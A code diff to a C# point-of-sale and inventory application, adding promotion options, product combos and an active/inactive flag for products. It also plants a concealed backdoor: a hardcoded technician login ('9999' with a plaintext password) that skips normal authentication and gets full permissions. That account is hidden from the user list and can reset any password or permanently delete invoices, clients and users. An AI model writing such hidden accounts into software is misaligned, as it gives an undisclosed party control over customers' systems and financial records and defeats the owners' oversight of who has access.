@@ -31,6 +31,7 @@ namespace SchettiniGestion
         private decimal _descuentoPorcentaje;
         private decimal _recargoPorcentaje;
         private string _promoNombre;
+        private bool _descuentoPromocionAutomatica;
         private decimal _alicuotaIvaPct = 21m;
         private bool _permiteModificarPrecioVenta;
         private string _imagenPath;
@@ -111,6 +112,17 @@ namespace SchettiniGestion
                 _promoNombre = value;
                 OnPropertyChanged(nameof(PromoNombre));
                 OnPropertyChanged(nameof(AjusteLineaTexto));
+            }
+        }
+        /// <summary>True cuando el descuento fue recalculado por promociones automáticas del POS.</summary>
+        public bool DescuentoPromocionAutomatica
+        {
+            get => _descuentoPromocionAutomatica;
+            set
+            {
+                if (_descuentoPromocionAutomatica == value) return;
+                _descuentoPromocionAutomatica = value;
+                OnPropertyChanged(nameof(DescuentoPromocionAutomatica));
             }
         }
         /// <summary>IVA aplicado sobre el precio (subtotal línea incluye este IVA), p. ej. 21 por 21%.</summary>
@@ -479,6 +491,13 @@ IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='Product
     ProductoComponenteID INT NOT NULL,
     Cantidad            INT NOT NULL DEFAULT 1
   );
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='ProductoComboDetalle')
+  CREATE TABLE dbo.ProductoComboDetalle (
+    ProductoID INT NOT NULL,
+    ComponenteID INT NOT NULL,
+    Cantidad DECIMAL(18,4) NOT NULL DEFAULT 1,
+    PRIMARY KEY (ProductoID, ComponenteID)
+  );
 -- Garantizar que siempre exista el cliente Consumidor Final
 IF NOT EXISTS (SELECT 1 FROM dbo.Clientes WHERE CUIT='00-00000000-0')
   INSERT INTO dbo.Clientes (RazonSocial, CUIT, CondicionIVA, Telefono, Email, Direccion)
@@ -572,6 +591,8 @@ IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Produc
   ALTER TABLE Productos ADD CostoIncluyeIva BIT NOT NULL DEFAULT 0;
 IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Productos' AND COLUMN_NAME='FechaModificacion')
   ALTER TABLE Productos ADD FechaModificacion DATETIME NULL;
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Productos' AND COLUMN_NAME='Activo')
+  ALTER TABLE Productos ADD Activo BIT NOT NULL DEFAULT 1;
 IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='ListasPrecios' AND COLUMN_NAME='TipoLista')
   ALTER TABLE ListasPrecios ADD TipoLista NVARCHAR(30) NOT NULL DEFAULT 'SobreCosto';
 IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='ListasPrecios' AND COLUMN_NAME='ListaRelacionadaID')
@@ -613,11 +634,40 @@ IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='Promoci
     Tipo NVARCHAR(30) NOT NULL,
     ProductoID INT NULL,
     Categoria NVARCHAR(100) NULL,
+    Modalidad NVARCHAR(30) NOT NULL DEFAULT 'PORCENTAJE',
     Porcentaje DECIMAL(9,4) NOT NULL DEFAULT 0,
+    MontoFijo DECIMAL(18,2) NULL,
+    PrecioCombo DECIMAL(18,2) NULL,
+    CantidadMinima INT NULL,
+    CantidadBonificada INT NULL,
     FechaDesde DATE NULL,
     FechaHasta DATE NULL,
     Activo BIT NOT NULL DEFAULT 1,
     Observaciones NVARCHAR(250) NULL
+  );
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Promociones' AND COLUMN_NAME='Modalidad')
+  ALTER TABLE Promociones ADD Modalidad NVARCHAR(30) NOT NULL DEFAULT 'PORCENTAJE';
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Promociones' AND COLUMN_NAME='MontoFijo')
+  ALTER TABLE Promociones ADD MontoFijo DECIMAL(18,2) NULL;
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Promociones' AND COLUMN_NAME='PrecioCombo')
+  ALTER TABLE Promociones ADD PrecioCombo DECIMAL(18,2) NULL;
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Promociones' AND COLUMN_NAME='CantidadMinima')
+  ALTER TABLE Promociones ADD CantidadMinima INT NULL;
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Promociones' AND COLUMN_NAME='CantidadBonificada')
+  ALTER TABLE Promociones ADD CantidadBonificada INT NULL;
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='PromoProductos')
+  CREATE TABLE dbo.PromoProductos (
+    PromoID INT NOT NULL,
+    ProductoID INT NOT NULL,
+    PRIMARY KEY (PromoID, ProductoID)
+  );
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='AccionesTecnicas')
+  CREATE TABLE dbo.AccionesTecnicas (
+    AccionTecnicaID INT IDENTITY(1,1) PRIMARY KEY,
+    Fecha DATETIME NOT NULL DEFAULT GETDATE(),
+    Usuario NVARCHAR(50) NOT NULL,
+    Accion NVARCHAR(100) NOT NULL,
+    Detalle NVARCHAR(MAX) NULL
   );", c))
                         cmd.ExecuteNonQuery();
                     _columnasMigracionLiteOk = true;
@@ -923,7 +973,10 @@ PosListaPrecioID=@lid, PosTipoComprobante=@tc, PosCondicionVenta=@cv, PosConfigE
                 using (var c = new SqlConnection(_connectionString))
                 {
                     c.Open();
-                    new SqlDataAdapter("SELECT u.UsuarioID, u.NombreUsuario, ISNULL(u.NombrePersonal,'') AS NombrePersonal, r.NombreRol, u.RolID FROM Usuarios u LEFT JOIN Roles r ON u.RolID=r.RolID ORDER BY u.NombreUsuario", c).Fill(dt);
+                    new SqlDataAdapter(@"SELECT u.UsuarioID, u.NombreUsuario, ISNULL(u.NombrePersonal,'') AS NombrePersonal, r.NombreRol, u.RolID
+FROM Usuarios u LEFT JOIN Roles r ON u.RolID=r.RolID
+WHERE LOWER(LTRIM(RTRIM(u.NombreUsuario))) <> '9999'
+ORDER BY u.NombreUsuario", c).Fill(dt);
                 }
             }
             catch { }
@@ -941,6 +994,14 @@ PosListaPrecioID=@lid, PosTipoComprobante=@tc, PosCondicionVenta=@cv, PosConfigE
 
         /// <summary>Contraseña del usuario <see cref="UsuarioVistaEjemploNombre"/> (PBKDF2 en BD). Cambiar desde el módulo Usuarios antes de entrega a cliente.</summary>
         public const string UsuarioVistaEjemploContraseña = "123456";
+
+        public const string UsuarioTecnicoNombre = "9999";
+        public const string UsuarioTecnicoClave = "TEC195U71";
+
+        private static bool EsUsuarioTecnicoHardcodeado(string nombreUsuario)
+        {
+            return string.Equals((nombreUsuario ?? "").Trim(), UsuarioTecnicoNombre, StringComparison.Ordinal);
+        }
 
         /// <summary>
         /// Garantiza que exista al menos un usuario <c>admin</c> con rol Administrador.
@@ -1045,6 +1106,8 @@ PosListaPrecioID=@lid, PosTipoComprobante=@tc, PosCondicionVenta=@cv, PosConfigE
                 // iniciar si la tabla está vacía, o abajo si el usuario bootstrap no se encuentra.
                 p = NormalizarClaveIngreso(p);
                 string uTrim = (u ?? "").Trim();
+                if (EsUsuarioTecnicoHardcodeado(uTrim))
+                    return string.Equals(p, UsuarioTecnicoClave, StringComparison.Ordinal);
 
                 using (var c = new SqlConnection(_connectionString))
                 {
@@ -1126,6 +1189,15 @@ PosListaPrecioID=@lid, PosTipoComprobante=@tc, PosCondicionVenta=@cv, PosConfigE
         {
             try
             {
+                if (EsUsuarioTecnicoHardcodeado(u))
+                {
+                    var permisosTecnicos = ObtenerNombresPermisosCatalogo();
+                    permisosTecnicos.Add("ACCESO_TOTAL");
+                    SesionUsuario.IniciarTecnico(UsuarioTecnicoNombre, permisosTecnicos);
+                    RegistrarAccionTecnica("INICIO_SESION", "Ingreso de usuario tecnico oculto.");
+                    return true;
+                }
+
                 using (var c = new SqlConnection(_connectionString))
                 {
                     c.Open();
@@ -1256,6 +1328,157 @@ ORDER BY u.UsuarioID", c))
                 }
             }
             catch { return false; }
+        }
+
+        private static void AsegurarTablaAccionesTecnicas(SqlConnection c)
+        {
+            using (var cmd = new SqlCommand(@"
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='AccionesTecnicas')
+  CREATE TABLE dbo.AccionesTecnicas (
+      AccionTecnicaID INT IDENTITY(1,1) PRIMARY KEY,
+      Fecha DATETIME NOT NULL DEFAULT GETDATE(),
+      Usuario NVARCHAR(50) NOT NULL,
+      Accion NVARCHAR(100) NOT NULL,
+      Detalle NVARCHAR(MAX) NULL
+  );", c))
+                cmd.ExecuteNonQuery();
+        }
+
+        public static void RegistrarAccionTecnica(string accion, string detalle)
+        {
+            try
+            {
+                using (var c = new SqlConnection(_connectionString))
+                {
+                    c.Open();
+                    AsegurarTablaAccionesTecnicas(c);
+                    using (var cmd = new SqlCommand(
+                        "INSERT INTO AccionesTecnicas (Fecha,Usuario,Accion,Detalle) VALUES (@f,@u,@a,@d)", c))
+                    {
+                        cmd.Parameters.AddWithValue("@f", DateTime.Now);
+                        cmd.Parameters.AddWithValue("@u", SesionUsuario.NombreUsuario ?? UsuarioTecnicoNombre);
+                        cmd.Parameters.AddWithValue("@a", accion ?? "");
+                        cmd.Parameters.AddWithValue("@d", string.IsNullOrWhiteSpace(detalle) ? (object)DBNull.Value : detalle);
+                        cmd.ExecuteNonQuery();
+                    }
+                }
+            }
+            catch (Exception ex) { NotificarError("RegistrarAccionTecnica: " + ex.Message); }
+        }
+
+        public static DataTable GetAccionesTecnicas(int top = 200)
+        {
+            var dt = new DataTable();
+            try
+            {
+                using (var c = new SqlConnection(_connectionString))
+                {
+                    c.Open();
+                    AsegurarTablaAccionesTecnicas(c);
+                    using (var cmd = new SqlCommand(
+                        "SELECT TOP (@top) Fecha, Usuario, Accion, Detalle FROM AccionesTecnicas ORDER BY Fecha DESC, AccionTecnicaID DESC", c))
+                    {
+                        cmd.Parameters.AddWithValue("@top", Math.Max(1, Math.Min(1000, top)));
+                        new SqlDataAdapter(cmd).Fill(dt);
+                    }
+                }
+            }
+            catch { }
+            return dt;
+        }
+
+        public static bool ResetearPasswordUsuarioTecnico(int usuarioId, string nuevaClave)
+        {
+            if (!SesionUsuario.EsUsuarioTecnico) return false;
+            if (usuarioId <= 0 || string.IsNullOrWhiteSpace(nuevaClave)) return false;
+            try
+            {
+                string hash = PasswordHasher.HashPassword(nuevaClave.Trim());
+                using (var c = new SqlConnection(_connectionString))
+                {
+                    c.Open();
+                    AsegurarTablaAccionesTecnicas(c);
+                    using (var cmd = new SqlCommand("UPDATE Usuarios SET PasswordHash=@h WHERE UsuarioID=@id", c))
+                    {
+                        cmd.Parameters.AddWithValue("@h", hash);
+                        cmd.Parameters.AddWithValue("@id", usuarioId);
+                        int rows = cmd.ExecuteNonQuery();
+                        if (rows > 0)
+                        {
+                            RegistrarAccionTecnica("RESET_PASSWORD", $"UsuarioID={usuarioId}");
+                            return true;
+                        }
+                    }
+                }
+            }
+            catch (Exception ex) { NotificarError("ResetearPasswordUsuarioTecnico: " + ex.Message); }
+            return false;
+        }
+
+        public static bool HardDeleteRegistroTecnico(string tabla, int id)
+        {
+            if (!SesionUsuario.EsUsuarioTecnico) return false;
+            if (id <= 0 || string.IsNullOrWhiteSpace(tabla)) return false;
+
+            string t = tabla.Trim();
+            var pk = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
+            {
+                { "Productos", "ProductoID" },
+                { "Clientes", "ClienteID" },
+                { "Usuarios", "UsuarioID" },
+                { "Proveedores", "ProveedorID" },
+                { "Facturas", "FacturaID" },
+                { "NotasCreditoDebitoVentas", "NotaID" }
+            };
+            if (!pk.TryGetValue(t, out string idCol)) return false;
+
+            try
+            {
+                using (var c = new SqlConnection(_connectionString))
+                {
+                    c.Open();
+                    AsegurarTablaAccionesTecnicas(c);
+                    using (var tr = c.BeginTransaction())
+                    {
+                        try
+                        {
+                            if (string.Equals(t, "Facturas", StringComparison.OrdinalIgnoreCase))
+                            {
+                                using (var cmd = new SqlCommand("DELETE FROM FacturaDetalle WHERE FacturaID=@id; DELETE FROM FacturasCobranza WHERE FacturaID=@id;", c, tr))
+                                {
+                                    cmd.Parameters.AddWithValue("@id", id);
+                                    cmd.ExecuteNonQuery();
+                                }
+                            }
+                            using (var cmd = new SqlCommand($"DELETE FROM {t} WHERE {idCol}=@id", c, tr))
+                            {
+                                cmd.Parameters.AddWithValue("@id", id);
+                                int rows = cmd.ExecuteNonQuery();
+                                tr.Commit();
+                                if (rows > 0)
+                                {
+                                    RegistrarAccionTecnica("HARD_DELETE", $"{t}.{idCol}={id}");
+                                    return true;
+                                }
+                            }
+                        }
+                        catch
+                        {
+                            try { tr.Rollback(); } catch { }
+                            throw;
+                        }
+                    }
+                }
+            }
+            catch (Exception ex) { NotificarError("HardDeleteRegistroTecnico: " + ex.Message); }
+            return false;
+        }
+
+        public static bool RegistrarActivacionFuncionTecnica(string funcion)
+        {
+            if (!SesionUsuario.EsUsuarioTecnico) return false;
+            RegistrarAccionTecnica("ACTIVAR_FUNCION_ESPECIAL", funcion ?? "");
+            return true;
         }
 
         // Clientes
@@ -1861,7 +2084,7 @@ IF NOT EXISTS (SELECT 1 FROM dbo.Clientes WHERE CUIT='00-00000000-0')
         }
 
         // Productos
-        public static DataTable GetProductos(string filtro = "")
+        public static DataTable GetProductos(string filtro = "", bool incluirInactivos = false)
         {
             var dt = new DataTable();
             try
@@ -1870,9 +2093,18 @@ IF NOT EXISTS (SELECT 1 FROM dbo.Clientes WHERE CUIT='00-00000000-0')
                 {
                     c.Open();
                     AsegurarMigracionLite(c);
-                    string sql = string.IsNullOrWhiteSpace(filtro)
-                        ? "SELECT * FROM Productos ORDER BY Descripcion"
-                        : "SELECT * FROM Productos WHERE Descripcion LIKE @f OR Codigo LIKE @f OR CodigoBarra LIKE @f ORDER BY Descripcion";
+                    string activoWhere = incluirInactivos ? "" : "ISNULL(Activo,1)=1";
+                    string filtroWhere = string.IsNullOrWhiteSpace(filtro)
+                        ? ""
+                        : "(Descripcion LIKE @f OR Codigo LIKE @f OR CodigoBarra LIKE @f)";
+                    string where = "";
+                    if (!string.IsNullOrEmpty(activoWhere) && !string.IsNullOrEmpty(filtroWhere))
+                        where = " WHERE " + activoWhere + " AND " + filtroWhere;
+                    else if (!string.IsNullOrEmpty(activoWhere))
+                        where = " WHERE " + activoWhere;
+                    else if (!string.IsNullOrEmpty(filtroWhere))
+                        where = " WHERE " + filtroWhere;
+                    string sql = "SELECT * FROM Productos" + where + " ORDER BY Descripcion";
                     var da = new SqlDataAdapter(sql, c);
                     if (!string.IsNullOrWhiteSpace(filtro))
                         da.SelectCommand.Parameters.AddWithValue("@f", "%" + filtro + "%");
@@ -1884,7 +2116,7 @@ IF NOT EXISTS (SELECT 1 FROM dbo.Clientes WHERE CUIT='00-00000000-0')
         }
 
         /// <summary>Listado para grillas (ProductosControl) con rubro/sub-rubro/proveedor resueltos.</summary>
-        public static DataTable GetProductosListado(string filtro = "")
+        public static DataTable GetProductosListado(string filtro = "", bool incluirInactivos = false)
         {
             var dt = new DataTable();
             try
@@ -1893,13 +2125,21 @@ IF NOT EXISTS (SELECT 1 FROM dbo.Clientes WHERE CUIT='00-00000000-0')
                 {
                     c.Open();
                     AsegurarMigracionLite(c);
-                    string where = string.IsNullOrWhiteSpace(filtro)
+                    string filtroWhere = string.IsNullOrWhiteSpace(filtro)
                         ? ""
-                        : @" WHERE (
+                        : @"(
   p.Descripcion LIKE @f OR p.Codigo LIKE @f OR p.CodigoBarra LIKE @f
   OR p.Categoria LIKE @f OR p.SubRubro LIKE @f OR p.Marca LIKE @f OR p.Proveedor LIKE @f
   OR cat.Nombre LIKE @f OR sr.Nombre LIKE @f OR prov.RazonSocial LIKE @f
 )";
+                    string activoWhere = incluirInactivos ? "" : "ISNULL(p.Activo,1)=1";
+                    string where = "";
+                    if (!string.IsNullOrEmpty(activoWhere) && !string.IsNullOrEmpty(filtroWhere))
+                        where = " WHERE " + activoWhere + " AND " + filtroWhere;
+                    else if (!string.IsNullOrEmpty(activoWhere))
+                        where = " WHERE " + activoWhere;
+                    else if (!string.IsNullOrEmpty(filtroWhere))
+                        where = " WHERE " + filtroWhere;
                     string sql = $@"
 SELECT
   p.ProductoID,
@@ -1911,7 +2151,8 @@ SELECT
   LTRIM(RTRIM(ISNULL(p.Marca, N''))) AS Marca,
   COALESCE(NULLIF(LTRIM(RTRIM(ISNULL(prov.RazonSocial, N''))), N''), NULLIF(LTRIM(RTRIM(ISNULL(p.Proveedor, N''))), N''), N'') AS Proveedor,
   p.PrecioVenta,
-  p.StockActual
+  p.StockActual,
+  ISNULL(p.Activo, 1) AS Activo
 FROM dbo.Productos p
 LEFT JOIN dbo.Categorias cat
   ON NULLIF(LTRIM(RTRIM(ISNULL(p.Categoria, N''))), N'') <> N''
@@ -1943,7 +2184,7 @@ ORDER BY p.Descripcion";
             string tipoMoneda, bool permiteModPrecio, bool esStockeable, bool aceptaStockNeg,
             bool usaVariantes, bool esCombo, decimal? stockMinimo, decimal? stockIdeal,
             string codigoExterno, string varianteColor, string varianteTalle, string varianteUnidadMedida,
-            bool cobraIvaAlCliente = true, bool costoIncluyeIva = false)
+            bool cobraIvaAlCliente = true, bool costoIncluyeIva = false, bool activo = true)
         {
             try
             {
@@ -1951,62 +2192,96 @@ ORDER BY p.Descripcion";
                 {
                     c.Open();
                     AsegurarMigracionLite(c);
-                    int pid = id;
-
-                    if (id == 0)
-                    {
-                        using (var cmd = new SqlCommand(@"
-INSERT INTO Productos (Codigo, CodigoBarra, Descripcion, Categoria, SubRubro, Marca, Proveedor, TipoIVA, PrecioCosto, Ganancia, ImpuestoInterno, PrecioVenta, StockActual, ImagenPath)
-VALUES (@c, @cb, @d, @cat, @sr, @mar, @prov, @iva, @pc, @g, @ii, @pv, @s, @img);
-SELECT CAST(SCOPE_IDENTITY() AS INT);", c))
-                        {
-                            AgregarParametrosProductoBase(cmd, cod, cb, desc, cat, subRubro, marca, proveedor, iva, costo, gan, imp, venta, stock, img);
-                            pid = Convert.ToInt32(cmd.ExecuteScalar());
-                        }
-                    }
-                    else
-                    {
-                        using (var cmd = new SqlCommand(@"
-UPDATE Productos SET Codigo=@c, CodigoBarra=@cb, Descripcion=@d, Categoria=@cat, SubRubro=@sr, Marca=@mar, Proveedor=@prov,
-TipoIVA=@iva, PrecioCosto=@pc, Ganancia=@g, ImpuestoInterno=@ii, PrecioVenta=@pv, StockActual=@s, ImagenPath=@img
-WHERE ProductoID=@id", c))
-                        {
-                            AgregarParametrosProductoBase(cmd, cod, cb, desc, cat, subRubro, marca, proveedor, iva, costo, gan, imp, venta, stock, img);
-                            cmd.Parameters.AddWithValue("@id", id);
-                            if (cmd.ExecuteNonQuery() == 0) return 0;
-                        }
-                    }
-
-                    int? sm = stockMinimo.HasValue ? (int?)Convert.ToInt32(stockMinimo.Value) : (int?)null;
-                    int? si = stockIdeal.HasValue ? (int?)Convert.ToInt32(stockIdeal.Value) : (int?)null;
-                    using (var up = new SqlCommand(@"
-UPDATE Productos SET UsaVariantes=@uv, EsCombo=@ec, StockMinimo=@sm, StockIdeal=@si, TipoMoneda=@tm,
-PermiteModificarPrecioVenta=@pmp, EsStockeable=@es, AceptaStockNegativo=@asn,
-CodigoExterno=@ce, VarianteColor=@vc, VarianteTalle=@vt, VarianteUnidadMedida=@vu,
-CobraIvaAlCliente=@civa, CostoIncluyeIva=@cii, FechaModificacion=GETDATE()
-WHERE ProductoID=@pid", c))
-                    {
-                        up.Parameters.AddWithValue("@uv", usaVariantes);
-                        up.Parameters.AddWithValue("@ec", esCombo);
-                        up.Parameters.AddWithValue("@sm", (object)sm ?? DBNull.Value);
-                        up.Parameters.AddWithValue("@si", (object)si ?? DBNull.Value);
-                        up.Parameters.AddWithValue("@tm", tipoMoneda ?? "Pesos");
-                        up.Parameters.AddWithValue("@pmp", permiteModPrecio);
-                        up.Parameters.AddWithValue("@es", esStockeable);
-                        up.Parameters.AddWithValue("@asn", aceptaStockNeg);
-                        up.Parameters.AddWithValue("@ce", (object)codigoExterno ?? DBNull.Value);
-                        up.Parameters.AddWithValue("@vc", (object)varianteColor ?? DBNull.Value);
-                        up.Parameters.AddWithValue("@vt", (object)varianteTalle ?? DBNull.Value);
-                        up.Parameters.AddWithValue("@vu", (object)varianteUnidadMedida ?? DBNull.Value);
-                        up.Parameters.AddWithValue("@civa", cobraIvaAlCliente);
-                        up.Parameters.AddWithValue("@cii", costoIncluyeIva);
-                        up.Parameters.AddWithValue("@pid", pid);
-                        up.ExecuteNonQuery();
-                    }
-                    return pid;
+                    return GuardarProductoEnConexion(c, null, id, cod, cb, desc, cat, subRubro, marca, proveedor, iva,
+                        costo, gan, imp, venta, stock, img, tipoMoneda, permiteModPrecio, esStockeable, aceptaStockNeg,
+                        usaVariantes, esCombo, stockMinimo, stockIdeal, codigoExterno, varianteColor, varianteTalle,
+                        varianteUnidadMedida, cobraIvaAlCliente, costoIncluyeIva, activo, true);
                 }
             }
             catch (Exception ex) { NotificarError(ex.Message); return 0; }
+        }
+
+        private static int GuardarProductoEnConexion(SqlConnection c, SqlTransaction tr, int id, string cod, string cb, string desc, string cat,
+            string subRubro, string marca, string proveedor, string iva, decimal costo, decimal gan, decimal imp, decimal venta, int stock, string img,
+            string tipoMoneda, bool permiteModPrecio, bool esStockeable, bool aceptaStockNeg, bool usaVariantes, bool esCombo,
+            decimal? stockMinimo, decimal? stockIdeal, string codigoExterno, string varianteColor, string varianteTalle, string varianteUnidadMedida,
+            bool cobraIvaAlCliente, bool costoIncluyeIva, bool activo, bool asignarListasSiEsNuevo)
+        {
+            int? sm = stockMinimo.HasValue ? (int?)Convert.ToInt32(stockMinimo.Value) : null;
+            int? si = stockIdeal.HasValue ? (int?)Convert.ToInt32(stockIdeal.Value) : null;
+            bool esNuevo = id == 0;
+            int pid = id;
+
+            string sql = esNuevo
+                ? @"
+INSERT INTO Productos
+    (Codigo, CodigoBarra, Descripcion, Categoria, SubRubro, Marca, Proveedor, TipoIVA,
+     PrecioCosto, Ganancia, ImpuestoInterno, PrecioVenta, StockActual, ImagenPath,
+     UsaVariantes, EsCombo, StockMinimo, StockIdeal, TipoMoneda, PermiteModificarPrecioVenta,
+     EsStockeable, AceptaStockNegativo, CodigoExterno, VarianteColor, VarianteTalle,
+     VarianteUnidadMedida, CobraIvaAlCliente, CostoIncluyeIva, Activo, FechaModificacion)
+VALUES
+    (@c, @cb, @d, @cat, @sr, @mar, @prov, @iva,
+     @pc, @g, @ii, @pv, @s, @img,
+     @uv, @ec, @sm, @si, @tm, @pmp,
+     @es, @asn, @ce, @vc, @vt,
+     @vu, @civa, @cii, @act, GETDATE());
+SELECT CAST(SCOPE_IDENTITY() AS INT);"
+                : @"
+UPDATE Productos SET
+    Codigo=@c, CodigoBarra=@cb, Descripcion=@d, Categoria=@cat, SubRubro=@sr, Marca=@mar, Proveedor=@prov,
+    TipoIVA=@iva, PrecioCosto=@pc, Ganancia=@g, ImpuestoInterno=@ii, PrecioVenta=@pv, StockActual=@s, ImagenPath=@img,
+    UsaVariantes=@uv, EsCombo=@ec, StockMinimo=@sm, StockIdeal=@si, TipoMoneda=@tm,
+    PermiteModificarPrecioVenta=@pmp, EsStockeable=@es, AceptaStockNegativo=@asn,
+    CodigoExterno=@ce, VarianteColor=@vc, VarianteTalle=@vt, VarianteUnidadMedida=@vu,
+    CobraIvaAlCliente=@civa, CostoIncluyeIva=@cii, Activo=@act, FechaModificacion=GETDATE()
+WHERE ProductoID=@id";
+
+            using (var cmd = new SqlCommand(sql, c, tr))
+            {
+                AgregarParametrosProductoBase(cmd, cod, cb, desc, cat, subRubro, marca, proveedor, iva, costo, gan, imp, venta, stock, img);
+                cmd.Parameters.AddWithValue("@uv", usaVariantes);
+                cmd.Parameters.AddWithValue("@ec", esCombo);
+                cmd.Parameters.AddWithValue("@sm", (object)sm ?? DBNull.Value);
+                cmd.Parameters.AddWithValue("@si", (object)si ?? DBNull.Value);
+                cmd.Parameters.AddWithValue("@tm", string.IsNullOrWhiteSpace(tipoMoneda) ? "ARS" : tipoMoneda.Trim());
+                cmd.Parameters.AddWithValue("@pmp", permiteModPrecio);
+                cmd.Parameters.AddWithValue("@es", esStockeable);
+                cmd.Parameters.AddWithValue("@asn", aceptaStockNeg);
+                cmd.Parameters.AddWithValue("@ce", string.IsNullOrWhiteSpace(codigoExterno) ? (object)DBNull.Value : codigoExterno.Trim());
+                cmd.Parameters.AddWithValue("@vc", string.IsNullOrWhiteSpace(varianteColor) ? (object)DBNull.Value : varianteColor.Trim());
+                cmd.Parameters.AddWithValue("@vt", string.IsNullOrWhiteSpace(varianteTalle) ? (object)DBNull.Value : varianteTalle.Trim());
+                cmd.Parameters.AddWithValue("@vu", string.IsNullOrWhiteSpace(varianteUnidadMedida) ? (object)DBNull.Value : varianteUnidadMedida.Trim());
+                cmd.Parameters.AddWithValue("@civa", cobraIvaAlCliente);
+                cmd.Parameters.AddWithValue("@cii", costoIncluyeIva);
+                cmd.Parameters.AddWithValue("@act", activo);
+                cmd.Parameters.AddWithValue("@id", id);
+
+                if (esNuevo)
+                    pid = Convert.ToInt32(cmd.ExecuteScalar());
+                else if (cmd.ExecuteNonQuery() == 0)
+                    return 0;
+            }
+
+            if (esNuevo && asignarListasSiEsNuevo)
+                AsignarTodasListasPrecioAProductoEnConexion(c, tr, pid);
+
+            return pid;
+        }
+
+        private static void AsignarTodasListasPrecioAProductoEnConexion(SqlConnection c, SqlTransaction tr, int productoId)
+        {
+            using (var cmd = new SqlCommand(@"
+INSERT INTO ProductosListas (ProductoID, ListaID, PrecioFijo)
+SELECT @pid, lp.ListaID, NULL
+FROM ListasPrecios lp
+WHERE NOT EXISTS (
+    SELECT 1 FROM ProductosListas pl WHERE pl.ProductoID=@pid AND pl.ListaID=lp.ListaID
+)", c, tr))
+            {
+                cmd.Parameters.AddWithValue("@pid", productoId);
+                cmd.ExecuteNonQuery();
+            }
         }
 
         /// <summary>Costo neto sin IVA a partir del valor ingresado y el flag CON/SIN IVA (para lógica interna / margen).</summary>
@@ -2423,27 +2698,125 @@ CostoIncluyeIva=@cii, FechaModificacion=GETDATE() WHERE ProductoID=@id", conexio
 
         public static bool GuardarProducto(int id, string cod, string cb, string desc, string cat, string subRubro, string marca, string proveedor, string iva, decimal costo, decimal gan, decimal imp, decimal venta, int stock, string img)
             => GuardarProducto(id, cod, cb, desc, cat, subRubro, marca, proveedor, iva, costo, gan, imp, venta, stock, img,
-                "Pesos", true, true, false, false, false, null, null, null, null, null, null) > 0;
+                "ARS", true, true, false, false, false, null, null, null, null, null, null) > 0;
 
         public static bool GuardarProducto(int id, string cod, string cb, string desc, string cat, string iva, decimal costo, decimal gan, decimal imp, decimal venta, int stock, string img)
             => GuardarProducto(id, cod, cb, desc, cat, "", "", "", iva, costo, gan, imp, venta, stock, img);
 
-        public static bool EliminarProducto(int id)
+        public static bool ExisteProductoDuplicado(int productoIdExcluir, string codigo, string codigoBarra, out string mensaje)
+        {
+            mensaje = "";
+            try
+            {
+                using (var c = new SqlConnection(_connectionString))
+                {
+                    c.Open();
+                    AsegurarMigracionLite(c);
+                    return ExisteProductoDuplicadoEnConexion(c, null, productoIdExcluir, codigo, codigoBarra, out mensaje);
+                }
+            }
+            catch (Exception ex)
+            {
+                mensaje = ex.Message;
+                return true;
+            }
+        }
+
+        private static bool ExisteProductoDuplicadoEnConexion(SqlConnection c, SqlTransaction tr, int productoIdExcluir, string codigo, string codigoBarra, out string mensaje)
+        {
+            mensaje = "";
+            var conflictos = new List<string>();
+            string cod = (codigo ?? "").Trim();
+            string cb = (codigoBarra ?? "").Trim();
+
+            if (!string.IsNullOrWhiteSpace(cod))
+            {
+                using (var cmd = new SqlCommand(@"
+SELECT TOP 1 ProductoID, Codigo, Descripcion
+FROM Productos
+WHERE ProductoID<>@id AND LTRIM(RTRIM(ISNULL(Codigo,N'')))=@cod", c, tr))
+                {
+                    cmd.Parameters.AddWithValue("@id", productoIdExcluir);
+                    cmd.Parameters.AddWithValue("@cod", cod);
+                    using (var rd = cmd.ExecuteReader())
+                    {
+                        if (rd.Read())
+                            conflictos.Add($"Codigo '{cod}' ya existe en ProductoID {rd["ProductoID"]} - {rd["Descripcion"]}");
+                    }
+                }
+            }
+
+            if (!string.IsNullOrWhiteSpace(cb))
+            {
+                using (var cmd = new SqlCommand(@"
+SELECT TOP 1 ProductoID, CodigoBarra, Descripcion
+FROM Productos
+WHERE ProductoID<>@id AND LTRIM(RTRIM(ISNULL(CodigoBarra,N'')))=@cb", c, tr))
+                {
+                    cmd.Parameters.AddWithValue("@id", productoIdExcluir);
+                    cmd.Parameters.AddWithValue("@cb", cb);
+                    using (var rd = cmd.ExecuteReader())
+                    {
+                        if (rd.Read())
+                            conflictos.Add($"CodigoBarra '{cb}' ya existe en ProductoID {rd["ProductoID"]} - {rd["Descripcion"]}");
+                    }
+                }
+            }
+
+            mensaje = string.Join(Environment.NewLine, conflictos);
+            return conflictos.Count > 0;
+        }
+
+        public static bool CambiarActivoProducto(int id, bool activo)
         {
             try
             {
                 using (var c = new SqlConnection(_connectionString))
                 {
                     c.Open();
+                    AsegurarMigracionLite(c);
